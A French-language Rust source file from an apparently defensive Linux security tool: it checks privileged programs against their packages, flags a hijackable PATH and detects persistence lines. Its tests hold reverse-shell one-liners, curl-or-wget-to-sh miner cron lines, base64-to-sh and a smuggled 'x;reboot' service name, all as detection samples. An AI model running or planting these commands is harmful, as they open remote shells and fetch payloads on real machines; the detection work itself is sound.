/// modifiés (chemin, paquet) et le nombre de ceux qui n'ont pas pu être vérifiés.
fn comparer_aux_paquets(
    gestion: Paquets,
    systeme: &[std::path::PathBuf],
    anormaux: &mut Vec<std::path::PathBuf>,
) -> (Vec<(std::path::PathBuf, String)>, usize) {
    let mut par_paquet: std::collections::BTreeMap<String, Vec<std::path::PathBuf>> = std::collections::BTreeMap::new();
    for (p, proprietaire) in systeme.iter().zip(gestion.proprietaires(systeme)) {
        match proprietaire {
            Some(paquet) => par_paquet.entry(paquet).or_default().push(p.clone()),
            None => anormaux.push(p.clone()),
        }
    }
    let (mut modifies, mut non_verifies) = (Vec::new(), 0usize);
    // Chaque paquet se vérifie à part (pacman, zcat et sha256sum, ou dpkg --verify, en lecture seule) : 16 à la
    // fois plutôt qu'un par un, une vingtaine de paquets attendaient l'un après l'autre.
    let paquets: Vec<(&String, &Vec<std::path::PathBuf>)> = par_paquet.iter().collect();
    let mut etats = Vec::new();
    for groupe in paquets.chunks(16) {
        std::thread::scope(|s| {
            let fils: Vec<_> = groupe
                .iter()
                .map(|(paquet, fichiers)| s.spawn(move || gestion.modifies(paquet, fichiers)))
                .collect();
            etats.extend(fils.into_iter().map(|f| f.join().unwrap_or_default()));
        });
    }
    for ((paquet, fichiers), etats) in paquets.into_iter().zip(etats) {
        // Un fil qui a planté rend une liste vide : ses fichiers comptent comme non vérifiés.
        let etats = etats.into_iter().chain(std::iter::repeat(None));
        for (f, etat) in fichiers.iter().zip(etats) {
            match etat {
                Some(true) => modifies.push((f.clone(), paquet.clone())),
                Some(false) => {}
                None => non_verifies = non_verifies.saturating_add(1),
            }
        }
    }
    (modifies, non_verifies)
}

/// Ce que la lecture des programmes privilégiés a relevé, pour son jugement (séparé pour le corpus de détection).
pub(super) struct Releve {
    /// Programmes privilégiés changés depuis leur installation : (chemin montré, paquet).
    pub modifies: Vec<(String, String)>,
    /// Hors paquet, ou dans un dossier temporaire.
    pub anormaux: Vec<std::path::PathBuf>,
    /// Combien de programmes privilégiés dans les dossiers du système.
    pub systeme: usize,
    /// Le gestionnaire de paquets est reconnu.
    pub gestion: bool,
    pub non_verifies: usize,
    /// getcap a répondu.
    pub capacites_lues: bool,
    /// Les dossiers du PATH où d'autres peuvent écrire.
    pub path_dangereux: Vec<String>,
    /// La commande qui remet les paquets des programmes modifiés.
    pub reinstaller: String,
    /// Les gestes de défense qui retirent leurs droits aux modifiés (`gestes_de_privilegies`) ; vide : à la main.
    pub gestes_modifies: Vec<Defense>,
    /// De même pour les anormaux.
    pub gestes_anormaux: Vec<Defense>,
}

pub(super) fn juger_fichiers_suspects(r: &Releve) -> Vec<Constat> {
    let Releve {
        modifies,
        anormaux,
        systeme: n,
        gestion,
        non_verifies,
        capacites_lues,
        path_dangereux: dangereux,
        reinstaller,
        gestes_modifies,
        gestes_anormaux,
    } = r;
    let (n, non_verifies) = (*n, *non_verifies);
    let mut constats = Vec::new();
    if !modifies.is_empty() {
        let liste: Vec<String> = modifies
            .iter()
            .map(|(f, p)| trf!("{f} (paquet {p})", "{f} (package {p})"))
            .collect();
        let constat = alerte(
            "Fichiers suspects",
            Niveau::Critique,
            trf!(
                "Programme(s) privilégié(s) modifié(s) depuis leur installation : {}. Signe possible d'une porte dérobée.", "Privileged program(s) modified since install: {}. Possible sign of a backdoor.",
                liste.join(", ")
            ),
        )
        .manuel(
            tr!("Ne pas le lancer. Remettre l'original depuis les dépôts, puis lancer l'antivirus et changer vos mots de passe", "Do not run it. Restore the original from the repositories, then run the antivirus and change your passwords"),
            &[reinstaller],
        );
        // Retirer ses droits le rend inoffensif tout de suite ; la réinstallation reste à faire (elle les remet,
        // avec le programme d'origine).
        constats.push(crate::machine::defense::corriger(
            constat,
            trf!(
                "Retirer ses droits (setuid, capacités) pour qu'il ne puisse plus servir, puis le remettre depuis les dépôts ({}), lancer l'antivirus et changer vos mots de passe",
                "Remove its rights (setuid, capabilities) so it can no longer be used, then restore it from the repositories ({}), run the antivirus and change your passwords",
                reinstaller
            ),
            gestes_modifies,
        ));
    }
    if !anormaux.is_empty() {
        // Dans un dossier temporaire, n'importe qui choisit le nom : montré (message et commandes à taper), il est
        // rendu inoffensif.
        let liste: Vec<String> = anormaux
            .iter()
            .take(10)
            .map(|p| crate::ui::chemin_affichable(p))
            .collect();
        let constat = alerte(
            "Fichiers suspects",
            Niveau::Eleve,
            trf!(
                "Programme(s) setuid, setgid ou à capacités hors paquet ou dans un dossier temporaire : {}.", "Setuid, setgid or capability program(s) not from a package or in a temporary folder: {}.",
                liste.join(", ")
            ),
        )
        .manuel(
            tr!("Ces programmes peuvent donner des droits root : vérifier d'où ils viennent avant toute chose (ne pas les lancer)", "These programs can give root rights: check where they come from before anything else (do not run them)"),
            &[&format!("ls -l {}", liste.join(" ")), &format!("getcap {}", liste.join(" "))],
        );
        constats.push(crate::machine::defense::corriger(
            constat,
            tr!(
                "Leur retirer ces droits (setuid, setgid, capacités ; le fichier reste, Défaire les remet), puis chercher d'où ils viennent (ne pas les lancer)",
                "Remove those rights from them (setuid, setgid, capabilities; the file stays, Undo puts them back), then find out where they come from (do not run them)"
            ),
            gestes_anormaux,
        ));
    }
    // Un programme privilégié trouvé ne dit rien des capacités : getcap muet, elles n'ont pas été lues, et c'est dit.
    let trouves = !modifies.is_empty() || !anormaux.is_empty();
    if !capacites_lues && trouves {
        constats.push(crate::machine::impossible(
            "Fichiers suspects",
            tr!(
                "capacités des programmes : getcap absent",
                "program capabilities: getcap missing"
            ),
        ));
    }
    if modifies.is_empty() && anormaux.is_empty() {
        let mut message = match (gestion, non_verifies) {
            (false, _) => trf!(
                "Aucun programme privilégié dans les dossiers temporaires ; les {n} du système n'ont pas pu être \
                 rapprochés d'un paquet (gestionnaire de paquets non reconnu).",
                "No privileged program in temporary folders; the {n} system ones could not be \
                 matched to a package (package manager not recognized)."
            ),
            (true, 0) => trf!(
                "Aucun programme privilégié inhabituel : {n} setuid, setgid ou à capacités, tous d'un paquet et intacts.",
                "No unusual privileged program: {n} setuid, setgid or capability programs, all from a package and intact."
            ),
            (true, k) => trf!(
                "Aucun programme privilégié inhabituel : {n} setuid, setgid ou à capacités, tous d'un paquet ; \
                 {k} illisible(s), donc non comparé(s) à l'original.",
                "No unusual privileged program: {n} setuid, setgid or capability programs, all from a package; \
                 {k} unreadable, so not compared to the original."
            ),
        };
        if !capacites_lues {
            message.push_str(tr!(
                " Capacités non vérifiées (getcap absent).",
                " Capabilities not checked (getcap missing)."
            ));
        }
        constats.push(ok("Fichiers suspects", message));
    }
    if !dangereux.is_empty() {
        constats.push(
            alerte(
                "Fichiers suspects",
                Niveau::Eleve,
                trf!(
                    "PATH piégeable : {} (n'importe qui peut y déposer un faux « ls » ou « sudo »).",
                    "Hijackable PATH: {} (anyone can drop a fake “ls” or “sudo” there).",
                    dangereux.join(", ")
                ),
            )
            .manuel(
                tr!(
                    "Retirer ces dossiers du PATH (~/.bashrc, ~/.profile) ou corriger leurs droits",
                    "Remove these folders from the PATH (~/.bashrc, ~/.profile) or fix their permissions"
                ),
                &[],
            ),
        );
    }
    constats
}

#[allow(
    clippy::arithmetic_side_effects,
    clippy::as_conversions,
    reason = "essais : y déborder fait échouer l'essai"
)]
#[cfg(test)]
mod tests {
    use super::*;

    std::thread_local! {
        /// La dernière racine que `persistance_dans` a lue, sur ce fil d'essai.
        pub(super) static RACINE_LUE: std::cell::RefCell<Option<std::path::PathBuf>> =
            const { std::cell::RefCell::new(None) };
        /// L'uid du compte que voit `uid_du_compte` sur ce fil d'essai (valeur inventée).
        pub(super) static UID_DU_COMPTE: std::cell::Cell<u32> = const { std::cell::Cell::new(1000) };
    }

    /// D7a : les lignes suspectes des fichiers du système partent par des gestes de défense (une par ligne, sans
    /// doublon) ; une seule ligne ailleurs (dossier personnel, crontab du compte, variable de la session), ou trop de
    /// lignes, et tout reste à la main.
    #[test]
    fn lancements_retires_par_gestes() {
        use crate::machine::gestes_unix::{Defense, GesteUnix, analyser};
        let lancement = |retraits: Vec<Option<(&str, &str)>>| {
            let n = retraits.len();
            constat_des_lancements(Lancements {
                critiques: Vec::new(),
                suspects: (0..n).map(|i| format!("suspect {i}")).collect(),
                sources: Vec::new(),
                retraits: retraits
                    .into_iter()
                    .map(|r| r.map(|(f, l)| (f.into(), l.into())))
                    .collect(),
                ..Lancements::default()
            })
            .correctif
            .unwrap()
        };
        let k = lancement(vec![
            Some(("/etc/ld.so.preload", "/tmp/.x.so /usr/lib/y.so")),
            Some(("/etc/ld.so.preload", "/tmp/.x.so /usr/lib/y.so")),
            Some(("/etc/cron.d/maj", "* * * * * root curl http://exemple.test/x | sh")),
        ]);
        assert!(k.automatique);
        assert_eq!(k.commandes.len(), 2);
        assert!(
            k.commandes
                .iter()
                .all(|l| matches!(analyser(l), Some(GesteUnix::Defense(Defense::RetirerLigne(..), _))))
        );
        assert!(matches!(k.defaire, crate::machine::Defaire::Gestes(ref g) if g.len() == 2));
        // Un mélange : tout à la main.
        assert!(!lancement(vec![Some(("/etc/ld.so.preload", "/tmp/.x.so")), None]).automatique);
        assert!(
            !lancement(vec![
                Some(("/etc/ld.so.preload", "/tmp/.x.so")),
                Some(("/home/alice/.bashrc", "curl x | sh"))
            ])
            .automatique
        );
        // Un fichier au nom piégé n'est jamais désigné.
        assert!(!lancement(vec![Some(("/etc/cron.d/a b", "curl x | sh"))]).automatique);
        // Trop de lignes : à la main.
        let noms: Vec<String> = (0..=crate::machine::defense::GESTES_MAX)
            .map(|i| format!("/etc/cron.d/t{i}"))
            .collect();
        assert!(!lancement(noms.iter().map(|f| Some((f.as_str(), "curl x | sh"))).collect()).automatique);
    }

    /// D7a : chaque service ajouté à la main se désactive par un geste, jamais une unité de session ni du réseau ; un
    /// nom qu'un geste ne porte pas laisse tout à la main, et le nom montré dans la commande est échappé.
    #[test]
    fn services_ajoutes_par_gestes() {
        use crate::machine::gestes_unix::{Defense, GesteUnix, analyser};
        let noms = |v: &[&str]| v.iter().map(|n| (*n).to_string()).collect::<Vec<_>>();
        let k = juger_services_ajoutes(
            &noms(&["maj.timer", "nftables.service", "sauvegarde.service", "sshd.service"]),
            true,
        )
        .unwrap()
        .correctif
        .unwrap();
        assert!(k.automatique);
        let unites: Vec<String> = k
            .commandes
            .iter()
            .map(|l| match analyser(l) {
                Some(GesteUnix::Defense(Defense::DesactiverService(u), _)) => u.as_str().to_string(),
                _ => panic!("geste attendu : {l}"),
            })
            .collect();
        assert_eq!(unites, ["maj.timer", "sauvegarde.service"]);
        assert!(
            !juger_services_ajoutes(&noms(&["a.service"]), false)
                .unwrap()
                .correctif
                .unwrap()
                .automatique
        );
        let k = juger_services_ajoutes(&noms(&["a.service", "x;reboot.service"]), true)
            .unwrap()
            .correctif
            .unwrap();
        assert!(!k.automatique);
        assert!(
            k.commandes.iter().all(|c| c.starts_with("systemctl cat '")),
            "{:?}",
            k.commandes
        );
        assert!(juger_services_ajoutes(&[], true).is_none());
    }

    /// Essai QEMU D7a (Debian) : getcap muet et un setuid hors paquet trouvé, les capacités non lues sont dites à part
    /// (jamais tues derrière l'alerte) ; getcap lu, rien de plus.
    #[test]
    fn capacites_non_lues_dites_meme_avec_une_alerte() {
        let releve = |capacites_lues| Releve {
            modifies: Vec::new(),
            anormaux: vec![std::path::PathBuf::from("/usr/local/bin/alice-x")],
            systeme: 3,
            gestion: true,
            non_verifies: 0,
            capacites_lues,
            path_dangereux: Vec::new(),
            reinstaller: String::new(),
            gestes_modifies: Vec::new(),
            gestes_anormaux: Vec::new(),
        };
        let muet = juger_fichiers_suspects(&releve(false));
        assert!(muet.iter().any(|c| !c.verifie && c.message.contains("getcap")));
        let lu = juger_fichiers_suspects(&releve(true));
        assert!(lu.iter().all(|c| c.verifie));
        assert_eq!(muet.len(), lu.len() + 1);
    }

    /// D7a : un programme privilégié perd son setuid ou ses capacités par un geste ; tous ou aucun : un chemin qu'un
    /// geste ne porte pas, un programme qui n'a plus rien de privilégié ou une liste trop longue laisse tout à la main.
    #[test]
    fn privilegies_par_gestes() {
        use crate::machine::gestes_unix::Defense;
        use std::path::PathBuf;
        const AUCUN: [Defense; 0] = [];
        let p = |s: &str| PathBuf::from(s);
        let modes = |m: u32| move |_: &Path| Some(m);
        let g = gestes_de_privilegies(
            &[p("/tmp/alice-x"), p("/tmp/alice-y")],
            &[p("/tmp/alice-y")],
            |c: &Path| {
                Some(if c == Path::new("/tmp/alice-x") {
                    0o104_755
                } else {
                    0o100_755
                })
            },
        );
        assert!(
            matches!(g.as_slice(), [Defense::RetirerSetuid(a), Defense::RetirerCapacites(b)]
                if a.octets() == b"/tmp/alice-x" && b.octets() == b"/tmp/alice-y"),
            "{g:?}"
        );
        let g = gestes_de_privilegies(&[p("/tmp/alice-x")], &[p("/tmp/alice-x")], modes(0o102_755));
        assert_eq!(g.len(), 2);
        // Plus rien de privilégié (changé depuis le parcours), ou lu par personne : à la main.
        assert_eq!(
            gestes_de_privilegies(&[p("/tmp/alice-x"), p("/tmp/alice-z")], &[], |c: &Path| {
                (c == Path::new("/tmp/alice-x")).then_some(0o104_755)
            }),
            AUCUN
        );
        // Chemin qu'un geste ne porte pas : relatif, à « .. », vide.
        for forge in ["tmp/x", "/tmp/../usr/bin/sudo", "", "/tmp/x/"] {
            assert!(
                gestes_de_privilegies(&[p("/tmp/alice-x"), p(forge)], &[], modes(0o104_755)).is_empty(),
                "{forge}"
            );
        }
        let neuf: Vec<PathBuf> = (0..=crate::machine::defense::GESTES_MAX)
            .map(|i| p(&format!("/tmp/alice{i}")))
            .collect();
        assert_eq!(gestes_de_privilegies(&neuf, &[], modes(0o104_755)), AUCUN);
        assert_eq!(gestes_de_privilegies(&[], &[], modes(0o104_755)), AUCUN);
    }

    /// La ligne retirée est celle du fichier, fin « \r » comprise : l'empreinte que le fils root recalcule.
    #[test]
    fn ligne_telle_qu_ecrite() {
        assert_eq!(telle_qu_ecrite("a\r\nb\n", "a"), "a\r");
        assert_eq!(telle_qu_ecrite("a\nb", "b"), "b");
    }

    /// Le bilan lit la persistance depuis la vraie racine « / » : une autre (relative, ou absolue comme « /x »), le
    /// corpus, qui donne la sienne à `persistance_dans`, ne la verrait pas ; la racine lue est comparée à « / ».
    #[test]
    fn le_bilan_lit_depuis_la_racine() {
        RACINE_LUE.with(|r| *r.borrow_mut() = None);
        let _ = persistance();
        assert_eq!(
            RACINE_LUE.with(|r| r.borrow().clone()),
            Some(std::path::PathBuf::from("/"))
        );
    }

    /// Une seconde ligne suspecte dans un fichier déjà signalé change la clé (avant, seul le fichier y était) ;
    /// l'ordre de lecture et une ligne lue deux fois, non.
    #[test]
    fn nouvelle_ligne_nouvelle_cle() {
        let r1 = "bash -i >& /dev/tcp/10.0.0.9/4444 0>&1";
        let r2 = "curl -s http://exemple.invalid/x | sh";
        let cle = |lignes: &[&str]| {
            let sources = lignes.iter().map(|l| source_de("~/.bashrc", l)).collect();
            crate::modele::Cle::de("LNX-PRS-002", &objet_des_lancements(sources)).unwrap()
        };
        assert_ne!(cle(&[r1]), cle(&[r1, r2]));
        assert_eq!(cle(&[r1, r2]), cle(&[r2, r1, r2]));
        assert_ne!(cle(&[r1]), cle(&[r2]));
        // Les blancs du bord ne changent pas la ligne ; une autre source, si.
        assert_eq!(source_de("crontab", r1), source_de("crontab", &format!("  {r1}\t")));
        assert_ne!(source_de("crontab", r1), source_de("~/.bashrc", r1));
    }

    #[test]
    fn chemins_avant_fusion_de_usr() {
        assert_eq!(
            chemin_hors_usr(Path::new("/usr/bin/fusermount3")).unwrap(),
            Path::new("/bin/fusermount3")
        );
        assert_eq!(chemin_hors_usr(Path::new("/usr/sbin/x")).unwrap(), Path::new("/sbin/x"));
        assert!(chemin_hors_usr(Path::new("/usr/local/bin/x")).is_none());
        assert!(chemin_hors_usr(Path::new("/opt/x")).is_none());
    }

    #[test]
    fn path_piegeable() {
        let droits = |d: &str| match d {
            "/tmp" => Some(0o41777),          // modifiable par tous mais « sticky » : sûr
            "/srv/partage" => Some(0o40_777), // modifiable par tous, sans sticky : piège
            _ => Some(0o40_755),
        };
        assert_eq!(
            path_dangereux("/usr/bin:/tmp:/srv/partage:.::/bin", droits),
            vec!["/srv/partage", ".", "(vide = dossier courant)"]
        );
        assert_eq!(
            path_dangereux("/usr/local/bin:/usr/bin", droits),
            [] as [std::string::String; 0]
        );
    }

    #[test]
    fn programmes_privilegies() {
        assert_eq!(
            fichiers_capacites(
                "/usr/bin/newuidmap cap_setuid=ep\n/usr/bin/ping = cap_net_raw+ep\n/tmp/un dossier/x cap_sys_admin=ep\n"
            ),
            ["/usr/bin/newuidmap", "/usr/bin/ping", "/tmp/un dossier/x"].map(std::path::PathBuf::from)
        );
        assert_eq!(
            paquet_dpkg("libc6:amd64, libc6-dbg: /usr/bin/ldd\n").as_deref(),
            Some("libc6:amd64")
        );
        assert_eq!(
            paquet_dpkg("diversion by dash from: /bin/sh\ndash: /bin/sh\n").as_deref(),
            Some("dash")
        );
        let mtree = "#mtree\n./usr/bin/sudoedit time=1.0 type=link link=sudo\n./usr/bin/sudo time=1.0 mode=4755 sha256digest=e9f8\n";
        assert_eq!(
            empreinte_mtree(mtree, Path::new("/usr/bin/sudo")).as_deref(),
            Some("e9f8")
        );
        assert_eq!(empreinte_mtree(mtree, Path::new("/usr/bin/sudoedit")), None);
        // Seul « 5 » (contenu) compte : une date ou des droits changés ne prouvent pas un remplacement.
        let verif = "??5??????   /usr/bin/passwd\n.M.......   /usr/bin/su\nS.5....T.  c /etc/sudoers\n";
        assert!(contenu_modifie(verif, Path::new("/usr/bin/passwd")));
        assert!(!contenu_modifie(verif, Path::new("/usr/bin/su")));
        assert!(!contenu_modifie(verif, Path::new("/usr/bin/mount")));
    }

    #[test]
    fn lancements_suspects() {
        // Formes de porte dérobée reconnues partout.
        assert!(commande_suspecte("bash -c 'bash -i >& /dev/tcp/1.2.3.4/4444 0>&1'", false).is_some());
        assert!(commande_suspecte("nc -e /bin/sh 1.2.3.4 4444", false).is_some());
        // nc caché dans une sous-commande, après un « ; » ou derrière un chemin.
        for ligne in [
            "@reboot (nc -e /bin/sh 192.0.2.7 4444 &)",
            "* * * * * cd /tmp;nc -e /bin/sh 192.0.2.7 4444",
            "* * * * * true&&ncat -c bash 192.0.2.7 4444",
            "@reboot { /usr/bin/nc -e /bin/sh 192.0.2.7 4444; }",
            "sh -c '`netcat -e /bin/sh 192.0.2.7 4444`'",
        ] {
            assert!(commande_suspecte(ligne, false).is_some(), "{ligne}");
        }
        assert!(commande_suspecte("curl -fsSL https://x.example/a | sh", false).is_some());
        assert!(commande_suspecte("wget -qO- http://x | /bin/bash", false).is_some());
        assert!(commande_suspecte("echo aGk= | base64 -d | sh", false).is_some());
        // La ligne de cron des mineurs (TeamTNT, Kinsing), telle qu'ils la posent : le téléchargeur entre parenthèses,
        // curl ou à défaut wget, passé à sh.
        for cron in [
            "*/30 * * * * root (curl -fsSL http://192.0.2.7/a.sh||wget -q -O- http://192.0.2.7/a.sh)|sh",
            "*/30 * * * * (curl -fsSL http://192.0.2.7/a.sh||wget -q -O- http://192.0.2.7/a.sh)|sh",
            "* * * * * (curl -fsSL http://192.0.2.7/a.sh)|bash",
            "@reboot $(curl -fsSL http://192.0.2.7/a.sh)|sh",
            "* * * * * cd /tmp;wget -q -O- http://192.0.2.7/a.sh|sudo -u root sh",
        ] {
            assert_eq!(
                commande_suspecte(cron, false),
                Some(tr!(
                    "télécharge un script et l'exécute aussitôt",
                    "downloads a script and runs it right away"
                )),
                "{cron}"
            );
        }
        // Pas des portes dérobées : curl sans exécution, nc sans shell, grep après curl.
        assert!(commande_suspecte("curl -fsS https://x/a.json | jq .", false).is_none());
        assert!(commande_suspecte("nc -z 10.0.0.1 22", false).is_none());
        assert!(commande_suspecte("(nc -z 10.0.0.1 22 && echo ok)", false).is_none());
        assert!(commande_suspecte("export TMPDIR=/tmp/moi", false).is_none());
        // Programme lancé depuis /tmp ou un dossier caché : seulement pour une commande lancée.
        assert!(commande_suspecte("/tmp/.x/run --daemon", true).is_some());
        assert!(commande_suspecte("-/dev/shm/a", true).is_some());
        assert!(commande_suspecte("~/.cache/.u/agent", true).is_some());
        assert!(commande_suspecte("%h/.mozilla/x", true).is_some());
        assert!(commande_suspecte("~/.local/bin/plein-ecran", true).is_none());
        assert!(commande_suspecte("%h/.cargo/bin/vanguard surveiller", true).is_none());
        assert!(commande_suspecte("/usr/bin/xrandr --output DP-1", true).is_none());
        assert!(commande_suspecte("cd /tmp/x", false).is_none());
    }

    /// Le fichier qui lance un programme, tel qu'il est montré : court sous le dossier personnel, et inoffensif.
    #[test]
    fn fichiers_de_demarrage_montres() {
        let maison = Path::new("/home/alice");
        assert_eq!(
            court(Path::new("/home/alice/.config/autostart/x.desktop"), maison),
            "~/.config/autostart/x.desktop"
        );
        assert_eq!(court(Path::new("/etc/profile.d/a.sh"), maison), "/etc/profile.d/a.sh");
        assert_eq!(
            court(
                Path::new("/home/alice/.config/autostart/x\x1b]0;t\x07\x1b[2K\r\u{202e}.desktop"),
                maison
            ),
            "~/.config/autostart/x�]0;t��[2K��.desktop"
        );
    }

    #[test]
    fn lignes_de_demarrage() {
        assert_eq!(
            commande_lancee("ExecStart=-/usr/bin/foo -x").as_deref(),
            Some("-/usr/bin/foo -x")
        );
        assert_eq!(
            commande_lancee("Exec=steam -silent %U").as_deref(),
            Some("steam -silent %U")
        );
        assert_eq!(commande_lancee("exec-once = waybar").as_deref(), Some("waybar"));
        assert_eq!(
            commande_lancee(r#"o.exec_on_start("~/.local/bin/plein-ecran")"#).as_deref(),
            Some("~/.local/bin/plein-ecran")
        );
        assert_eq!(commande_lancee(r#"-- o.launch_on_start("my-service")"#), None);
        assert_eq!(commande_lancee("# ExecStart=/tmp/x"), None);
        assert_eq!(commande_lancee("Description=Exec=/tmp/x"), None);
        assert_eq!(commande_lancee("Name=Steam"), None);
        assert!(definit_prechargement("export LD_PRELOAD=/home/x/.l/libz.so"));
        assert!(definit_prechargement("env = LD_PRELOAD,/tmp/a.so"));
        assert!(!definit_prechargement("unset LD_PRELOAD"));
        assert!(!definit_prechargement("# LD_PRELOAD=/x"));
    }

    /// Une arborescence jetable (racine, dossier personnel d'alice), et la lecture de sa persistance : le constat des
    /// lancements.
    struct Maison {
        racine: std::path::PathBuf,
    }

    /// Les programmes du système de la racine jetable (des scripts vides) : un nom nu ne se tait que trouvé dans les
    /// dossiers du système (vérification 3).
    const PROGRAMMES_D_ESSAI: &[&str] = &[
        "sh",
        "bash",
        "env",
        "true",
        "sleep",
        "python3",
        "node",
        "kitty",
        "firefox",
        "nautilus",
        "mako",
        "obsidian",
        "uwsm",
        "uwsm-app",
        "hypridle",
        "loginctl",
        "xsetroot",
        "pkill",
        "hyprpicker",
        "notify-send",
        "waybar",
        "omarchy-launch-terminal",
        "omarchy-launch-or-focus",
        "omarchy-lock-screen",
        "omarchy-hook",
        "omarchy-menu",
        "omarchy-launch-webapp",
        // Vérification 3 : les lignes courantes inventées (`lignes_courantes_muettes`) et les cas des rapports.
        "swayosd-server",
        "fcitx5",
        "nm-applet",
        "1password",
        "flatpak",
        "steam",
        "systemctl",
        "dbus-update-activation-environment",
        "wl-paste",
        "cliphist",
        "hyprctl",
        "gsettings",
        "blueman-applet",
        "udiskie",
        "easyeffects",
        "playerctld",
        "setsid",
        "nohup",
        "syncthing",
        "gamemoderun",
        "swaybg",
        "make",
        "find",
        "prlimit",
        "setarch",
        "perl",
        "awk",
        "cat",
        "echo",
        "xargs",
        "footclient",
        "run0",
        "swaymsg",
        "gtk-launch",
        "dex",
        "unbuffer",
        "watchexec",
        "systemd-run",
        "xdg-terminal-exec",
    ];

    impl Maison {
        fn nouvelle(nom: &str) -> Maison {
            use std::os::unix::fs::PermissionsExt as _;
            let racine = crate::essais::temporaire().join(format!("vanguard-normal-{nom}-{}", std::process::id()));
            let _ = std::fs::remove_dir_all(&racine);
            std::fs::create_dir_all(racine.join("home/alice/.config/systemd/user")).unwrap();
            let bin = racine.join("usr/bin");
            std::fs::create_dir_all(&bin).unwrap();
            for p in PROGRAMMES_D_ESSAI {
                std::fs::write(bin.join(p), "#!/bin/sh\n").unwrap();
                std::fs::set_permissions(bin.join(p), std::fs::Permissions::from_mode(0o755)).unwrap();
            }
            std::os::unix::fs::symlink("usr/bin", racine.join("bin")).unwrap();
            Maison { racine }
        }

        fn chemin(&self, relatif: &str) -> std::path::PathBuf {
            self.racine.join("home/alice").join(relatif)
        }

        fn ecrire(&self, relatif: &str, texte: &str) {
            let p = self.chemin(relatif);
            std::fs::create_dir_all(p.parent().unwrap()).unwrap();
            let _ = std::fs::remove_file(&p);
            std::fs::write(p, texte).unwrap();
        }

        fn lancements(&self) -> Constat {
            persistance_dans(
                &self.racine,
                &self.racine.join("home/alice"),
                |v| (v == "XDG_RUNTIME_DIR").then(|| "/run/user/1000".into()),
                None,
                None,
            )
            .into_iter()
            .next()
            .unwrap()
        }
    }

    impl Drop for Maison {
        fn drop(&mut self) {
            let _ = std::fs::remove_dir_all(&self.racine);
        }
    }

    const UNITE: &str = "[Unit]\nDescription=Rappel\n\n[Service]\nType=oneshot\nExecStart=%h/.cache-x/rappel.sh\n";

    fn maison_avec_rappel(nom: &str) -> Maison {
        let m = Maison::nouvelle(nom);
        m.ecrire(".config/systemd/user/rappel.service", UNITE);
        m.ecrire(".cache-x/rappel.sh", "#!/bin/sh\necho rappel\n");
        m
    }

    /// COMP-3 : les unités que Vanguard pose dans le compte ne lèvent rien, dans les deux langues : veilleur,
    /// entretien, surveillance (d'aujourd'hui et d'avant), minuterie de la sauvegarde. Le `CPUQuota=20%` du veilleur
    /// sortait « réglage d'unité non lu » (LNX-PRS-002, Élevé) : le « % » final était pris pour un code de systemd.
    /// Le service de la sauvegarde, lui, est levé (D-1 : rsync lit ~/.popt, `la_sauvegarde_de_vanguard_est_levee`),
    /// et seul lui. Celles qu'il pose en administrateur (garde, ses listes, isolement,
    /// ajout d'Ollama) sont à root dans des dossiers à root (`de_root_seul`) : la liste permise ne les juge pas, et
    /// sous `unshare -r` (identités traduites) cet essai ne saurait le montrer ; elles n'y sont donc pas.
    #[test]
    fn les_unites_de_vanguard_ne_levent_rien() {
        use std::os::unix::fs::PermissionsExt as _;
        // S-2 (relecture 0.94) : chaque unité telle que Vanguard la pose, le programme au chemin de la copie posée
        // (~/.local/share/vanguard/bin/vanguard) comme à celui d'un paquet, la sauvegarde FAT et non FAT, un disque
        // et un dossier à espace.
        let exes = ["/usr/bin/vanguard", "/home/alice/.local/share/vanguard/bin/vanguard"];
        for (i, (anglais, exe, fat)) in [false, true]
            .into_iter()
            .flat_map(|a| exes.into_iter().flat_map(move |e| [false, true].map(|f| (a, e, f))))
            .enumerate()
        {
            let m = Maison::nouvelle(&format!("unites-de-vanguard-{i}"));
            for p in [exe, "/usr/bin/rsync", "/usr/bin/findmnt"] {
                let f = m.racine.join(p.trim_start_matches('/'));
                std::fs::create_dir_all(f.parent().unwrap()).unwrap();
                std::fs::write(&f, "#!/bin/sh\n").unwrap();
                std::fs::set_permissions(&f, std::fs::Permissions::from_mode(0o755)).unwrap();
            }
            for d in ["Documents", "Mes images"] {
                std::fs::create_dir_all(m.chemin(d)).unwrap();
            }
            // Le disque branché, sa destination posée : le cas le plus sage, levé quand même (D-1).
            std::fs::create_dir_all(m.racine.join("run/media/alice/Mon disque/Sauvegarde-Vanguard/poste")).unwrap();
            let unites = || {
                let (es, et) = crate::entretien::unites_systemd(exe);
                let (ss, st) =
                    crate::reseau::surveillance::unites_systemd(exe, crate::reseau::surveillance::Reglages::Aujourdhui);
                let (_, st_avant) =
                    crate::reseau::surveillance::unites_systemd(exe, crate::reseau::surveillance::Reglages::DAvant);
                let (svt, svs) = crate::sauvegarde::unites(
                    Path::new("/usr/bin/rsync"),
                    Some(Path::new("/usr/bin/findmnt")),
                    Some("1234-ABCD"),
                    Path::new("/run/media/alice/Mon disque"),
                    Path::new("/run/media/alice/Mon disque/Sauvegarde-Vanguard/poste"),
                    &[
                        std::path::PathBuf::from("/home/alice/Documents"),
                        std::path::PathBuf::from("/home/alice/Mes images"),
                    ],
                    fat,
                )
                .unwrap();
                let compte = vec![
                    (
                        crate::machine::linux::veilleur::UNITE.to_string(),
                        crate::machine::linux::veilleur::unite_dans(exe, anglais),
                    ),
                    (format!("{}.service", crate::entretien::NOM), es),
                    (format!("{}.timer", crate::entretien::NOM), et.to_string()),
                    (format!("{}.service", crate::reseau::surveillance::NOM), ss),
                    (format!("{}.timer", crate::reseau::surveillance::NOM), st.to_string()),
                    ("vanguard-surveillance-avant.timer".to_string(), st_avant.to_string()),
                    (crate::sauvegarde::TIMER.to_string(), svt),
                    (crate::sauvegarde::SERVICE.to_string(), svs),
                ];
                compte
            };
            let compte = if anglais {
                crate::langue::en_anglais(unites)
            } else {
                unites()
            };
            assert!(
                compte[0].1.contains("CPUQuota=20%"),
                "l'unité du veilleur a changé : revoir cet essai"
            );
            assert!(
                compte[7].1.contains(if fat {
                    " -rt --modify-window=2 "
                } else {
                    " -a --no-specials "
                }),
                "la sauvegarde a changé : revoir cet essai"
            );
            let (service, autres) = compte.split_last().unwrap();
            assert_eq!(service.0, crate::sauvegarde::SERVICE);
            for (nom, texte) in autres {
                m.ecrire(&format!(".config/systemd/user/{nom}"), texte);
            }
            let juger = || {
                persistance_dans(
                    &m.racine,
                    &m.chemin(""),
                    |v| (v == "XDG_RUNTIME_DIR").then(|| "/run/user/1000".into()),
                    None,
                    None,
                )
            };
            for c in &juger() {
                assert_eq!(
                    c.probleme, None,
                    "{exe}, fat {fat}, anglais {anglais} : {} {:?}",
                    c.regle, c.message
                );
            }
